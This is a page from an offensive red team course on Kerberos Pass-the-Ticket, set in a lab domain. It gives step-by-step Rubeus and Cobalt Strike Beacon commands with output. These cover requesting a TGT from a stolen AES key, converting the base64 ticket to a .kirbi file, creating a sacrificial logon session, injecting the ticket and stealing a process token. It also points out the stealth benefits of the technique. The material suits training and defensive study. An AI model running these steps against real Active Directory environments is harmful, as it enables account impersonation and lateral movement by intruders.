# Pass the Ticket

_Pass the Ticket_ (or PtT), is a technique \[[T1550.003](https://attack.mitre.org/techniques/T1550/003/)] that allows an adversary to leverage stolen, forged, or requested Kerberos tickets for user impersonation.  As with PtH, this can be implemented in different ways.  Tools like Impacket implement the Kerberos protocol for remote authentication, and tools like Rubeus inject tickets into the credential cache of a given logon session.

PtT is superior to PtH in a few important aspects.  Kerberos authentication is not anomalous, nor is it restricted as with NTLM; and passing tickets into a logon session can be done with native Windows APIs, so it does not rely on patching LSASS memory.  This makes it more stealthy, and isn't prevented by PPL.

### Requesting TGTs <a href="#el_1739798054883_386" id="el_1739798054883_386"></a>

We already saw in the [Credential Access](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops\&unit=67851a86ba9789af1107f5f9) section how Kerberos tickets can be extracted from memory.  But the adversary can also legitimately request Kerberos tickets on behalf of a user if they have their NTLM hash or AES encryption keys.  Using an NTLM hash will return RC4-encrypted tickets, which is generally not advisable.

Rubeus' `asktgt` command can be used with a user's AES key.  This will return a ticket in base64 encoded format.

```batch
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
[*] Building AS-REQ (w/ preauth) for: 'CONTOSO.COM\rsteel'
[*] Using domain controller: 10.10.120.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFo[...snip...]kNPTQ==

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  rsteel (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  17/02/2025 13:18:21
  EndTime                  :  17/02/2025 23:18:21
  RenewTill                :  24/02/2025 13:18:21
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  7ImgleIR6fnHZCxJW7MJUCabAjxvIsMS7Z55VRPaEHU=
  ASREP (key)              :  05579261E29FB01F23B007A89596353E605AE307AFCD1AD3234FA12F94EA696
```

### Injecting TGTs <a href="#el_1737371712675_349" id="el_1737371712675_349"></a>

Beacon has a `kerberos_ticket_use` command, which applies the given TGT to the current session.  The ticket must exist as a .kirbi file on the computer running the Cobalt Strike client.  If you have a base64 encoded ticket from Rubeus, you can write it to disk using PowerShell.

```
$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
```

If you pass a TGT into a logon session that already has one, then you'll overwrite the existing ticket.  For example, if your Beacon is running in the context of pchilds and you inject a TGT for rsteel into the current session, pchilds' TGT will be replaced with rsteel's.  We want to avoid clobbering tickets as much as possible because, although we want to leverage the ticket, we don't want to impact the real user's access to services in the domain.

The optimal strategy is to create a new logon session that we can impersonate.  This lets us use the Kerberos ticket, without affecting a user's existing logon session.  Before doing so, this `klist` output shows our current LUID is **0x11f831e**.  It contains a TGT and LDAP service ticket for pchilds.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/d3eadd45ba05f1cafac7fddd105b938f.png" alt="" width="100%"><figcaption></figcaption></figure>

Create a new logon session using `make_token`, providing a fake password (this assumes that we don't know the user's plaintext password).

```batch
beacon> make_token CONTOSO\rsteel FakePass
[+] Impersonated CONTOSO\rsteel (netonly)
```

Running `klist` again shows that our current LUID has changed, and there are no tickets in its cache.

Next, `kerberos_ticket_use` will inject the given ticket into this new session.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/5414d51e602edb764f76edc00fbb15f8.png" alt=""><figcaption></figcaption></figure>

```
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

The klist output will now show the injected ticket.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/eb42bccf2554b9b98a125d386509c700.png" alt="" width="100%"><figcaption></figcaption></figure>

Any Kerberos authentication that the Beacon now performs will be under the context of rsteel.  If at any point you want to remove the tickets from this session, but without actually disposing of the session itself, use `kerberos_ticket_purge`.  When we no longer need the session, use `rev2self` to dispose of it, and the Beacon session goes back to pchilds' context.

### The Rubeus way <a href="#el_1737374712288_609" id="el_1737374712288_609"></a>

There are some limitations with Beacon's built-in `kerberos_ticket_use` command.  The first is that it will only inject TGTs and not service tickets.  The second is that it only accepts .kirbi files on disk, which can be cumbersome.

Rubeus' `ptt` command can inject both TGTs and service ticket, and can accept base64 encoded tickets.  The syntax is `ptt /luid:[luid] /ticket:[ticket]`.  The ticket parameter can be the base64 encoded ticket, or a path to a .kirbi on disk (in this case it would be the disk of the machine Beacon is running on, not the machine running the CS client).

Rubeus also has a `createnetonly` command which can be used instead of Beacon's `make_token` command.  This spawns a hidden process in a new logon session and returns the PID and LUID.

```batch
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass

[*] Action: Create Process (/netonly)

[*] Using CONTOSO.COM\rsteel:FakePass

[*] Showing process : False
[*] Username        : rsteel
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\notepad.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2524
[+] LUID            : 0x132ef34
```

A ticket can then be injected.

```batch
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDCCBZygAwIBBaEDAgEWooIEqjCCBKZhggSiMIIEnqADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGQwggRgoAMCARKhAwIBAqKCBFIEggROtBamcnEu/7ynHLwUewKlaWuh5t/323kFYx8tjVxdEYlMwiqm+EMYSDI5Fz+nuNtX6Xx2JOafezhIrh7G/YdBP1ON6Mztyfk18HeLns88lioPofyqrVFEn/Z6LP/1FGVSvYE7ppoDFjq2wbD5WWMDm330g9U3XtfYTs/AuAVxrEIhOtdqZYnUHxuG2+dphKn4bz5L086edK32xOa0EyagP3elH6uPL0pijao3sS4ndpf6/gvdtBqAg2AR1vby27WEMeksfyWF7ysuL0ae6GwvpSrJuwhYC9vcLXYWtNK4UKWJpy+SrXXA8ylxsLHcWHYo0wz1+lsOCefpRk1TvrUUvKIPJhjSNHpPB3+6/aY5b1k8if8cxdet5vWCMloYprc9KpSRiu8AtZS0VPBvlUfTVe4z4SsmdI2N1z/OsQGfnPFm5O22dN8PKhI2C0jv8vSzB245kLiPHM1V+yL0f5zdN3RT0jn7bd3GoXEMKkxZllaqu6aenCnCtV4Wi9MhMeyWyRwsux5PxTh3BgXYG201FUiKDr3q5QWXNjpnFYplGQEOMYReMtt/AYN1fSPsPStCImmpSTjx9nuFOuEu9jadnhk2bRt6vMGQUKzO4vaFSzGFIbjWzT3y6cuViSMCugSVJaaFluAyw2a4vBpyb/tM/kzOiHm9BBW4/a1QRYdqF4/BSFM1RGXjqSqhoCFEN+bn1nPv4PDReTrHvFiUtX29Ehh3PThv7BFaNHfNTrS+IbVTC7kP8xKk88Puy/BpEsaFBkpLxGbNc9fT8JUI+D4IPmubUKR+ApfMKf4efdjqxVsfhXrJeUmPYLi3KnlhsGTkOvxvQ9F5npdZ4IB8mJBa68ExmC/6NML6DRJfkRPKmebTcMvwhlQ1o7bqor+hKglo0V5V0DI902nYR4LUoDoXkaWsz5NDPnEilwDe4hL8v6c3JOKLzWVMkxE8DrGqJF8Sv8JOYT4/380w/4Jl/CxjVcu59TuPO5sA2nTRRiKBEG9anfBkUPcw+pGCLBN6Fsr4+0qQckYFqxFbtDesXjUsEsuGG+yURhbuownT0c9bDMbasiuzH6BComfGS7b85bA3arTkzrIgXfD2T/baLjc9tHH2L8WmTkRkb34ecxn8aKnc9gBQKOgs+8X4LED2ZIcyMGm5ddNz83eZGeOlmlzVu72IYTU7L3nGP5sAHNmnl7bvPADqh7WVkH1okgs+McG83TzuO6Wf4w7Wu8gl5QCmODLkDb/0crOSPq81UzAFLZfSeaH1hKxvTTepxYP7VjwBJnWsm5nmQfd5m3hOb/YvJ1wC1VS5sFRJW0R9eFIzNh/Tof+a2QU6beI/8IntmoabVujrAn/2Z41gCd/zbH0KgsalQBCzPcK7cYrpsDZ7aLdizOmM7Z02mT1WhLsuQdaXXafc3+Ns3ZPQHCatUAMPU6qz4efKWnoZowFGFmHwVeMtl01D3q/1EaGg16A2yKOB4TCB3qADAgEAooHWBIHTfYHQMIHNoIHKMIHHMIHEoCswKaADAgESoSIEIGGgxK5dlc1UgsHScNHrnVcHwW7TspwF/Ki2xYMO7K2voQ0bC0NPTlRPU08uQ09NohMwEaADAgEBoQowCBsGcnN0ZWVsowcDBQBA4QAApREYDzIwMjUwMjE3MTM0MjMzWqYRGA8yMDI1MDIxNzIzNDIzM1qnERgPMjAyNTAyMjQxMzQyMzNaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==

[*] Action: Import Ticket
[*] Target LUID: 0x132ef34
[+] Ticket successfully imported!
```

Then steal the token of the spawned process to utilise the ticket.

```batch
beacon> steal_token 2524
[+] Impersonated CONTOSO\pchilds
```

To drop the impersonation, run `rev2self` then terminate the spawned process using Beacon's `kill` command.

### The getuid Confusion <a href="#el_1739800334134_550" id="el_1739800334134_550"></a>

Many students see the above output of `steal_token` and are confused as to why it would say _pchilds_ and not _rsteel_.  This is because the user information returned by `steal_token` and `getuid` is taken from the primary access token of the process.  It does not matter if you pass alternate credential material into the logon session to which the process is linked, either by PtH or PtT, the username returned will always be that of the user that spawned the process.

